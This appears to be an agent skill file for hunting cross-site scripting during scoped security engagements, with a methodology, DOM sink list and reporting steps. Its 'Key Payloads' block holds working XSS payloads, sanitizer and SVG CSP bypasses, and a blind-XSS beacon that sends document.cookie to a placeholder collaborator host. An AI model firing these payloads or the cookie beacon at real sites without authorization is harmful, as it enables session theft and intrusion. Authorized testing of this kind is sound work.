---
name: hunt-xss
description: XSS hunting - reflected, stored, DOM-based. Marker discipline to avoid false positives. Blind-XSS beacons for stored contexts. SVG/markdown/redirect vectors. Wiki-first, FIND schema output.
---

# Hunt: XSS

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "XSS cross-site scripting" via wiki-search MCP -> read matching technique page if found.
```
Apply known sanitizer bypasses and CSP bypass techniques already documented. Payload arsenals: `wiki/payloads/{xss,prototype-pollution}.md`.
Related client-side vectors: [[dangling-markup]] (scriptless HTML-injection exfil when script tags are blocked), [[xssi]] (JSONP/script-inclusion info leak), [[browser-extension-attacks]] (content-script/message-passing injection in an installed extension).


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip already-tested reflection points

## OOB Gate (for blind/stored XSS)
NOT confirmation: payload URL-encoded or HTML-encoded in response, `<script>` appears as `&lt;script&gt;`, ASP.NET validator blocked `<`.
IS confirmation: HTTP/DNS request to your unique Collaborator subdomain with browser User-Agent (Mozilla/Chrome).

**Marker discipline:** use unique 8+ char alphanumeric canaries (e.g., `x4hd2k9pq`), NOT `test`/`marker`/`evil`/`payload`. Check the baseline response for your canary before claiming reflection.

## Attack Surface Signals
High-value: admin panels (`*/admin`, `*/settings`), payment flows, stored wikis/labels/tags, SSO/signin pages, SVG upload endpoints.

DOM XSS signals in JS:
```javascript
document.write(  innerHTML =  location.hash  location.search
eval(  $.html(  $(location  document.referrer
```

## Methodology
1. Map all reflection points - URL params, form fields, HTTP headers, file upload names
2. Classify: Reflected / Stored / DOM
3. Probe sanitizer: send `aaa"bbb'ccc<ddd` - observe which chars escaped
4. Test allowlisted tag combos: `<math><style>`, `<svg><style>`, `<iframe srcdoc>`
5. Hunt SVG upload vectors - often bypasses CSP
6. Test markdown/RDoc: `[text](javascript:alert(1))`, `link:javascript:`
7. Check redirect params: `?redirect=javascript:alert(1)`
8. Test UTM params: `utm_source`, `utm_medium` - often unsanitized on marketing pages
9. Plant blind-XSS beacons in admin-viewable fields: error messages, User-Agent, Referer, username, email
10. Validate in real browser before reporting
11. **Distill to wiki (when confirmed):** if the finding is a reusable sanitizer bypass or CSP bypass, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/xss.md`. Promote later via `scripts/wiki-promote.py`.

## Key Payloads
```html
<!-- Context probe -->
aaa"bbb'ccc<ddd>eee`fff

<!-- Reflected baseline -->
"><script>alert(document.domain)</script>
<svg onload=alert(1)>

<!-- SVG (CSP bypass) -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- Sanitizer bypass -->
<math><style><img src=x onerror=alert(1)></style></math>

<!-- Blind-XSS beacon -->
<svg onload=fetch('//bxss-<tag>.<collab>/x?c='+document.cookie)>

<!-- Markdown -->
[Click](javascript:alert(document.domain))
```

## FIND Output

If XSS confirmed in browser (not just Burp):
```
Create Vulns/Research/FIND-XXX-SEVERITY-xss-<host>.md
Severity: HIGH for stored admin-context or session-theft demonstrated; MEDIUM for reflected requiring click; LOW for self-XSS without chain
Add row to Vuln-index.md
```

If path exhausted:
```
Append to Deadends.md: - [ ] XSS on <host> <param> -- payload encoded/rejected, [detail]
```

Report: Status + files created.
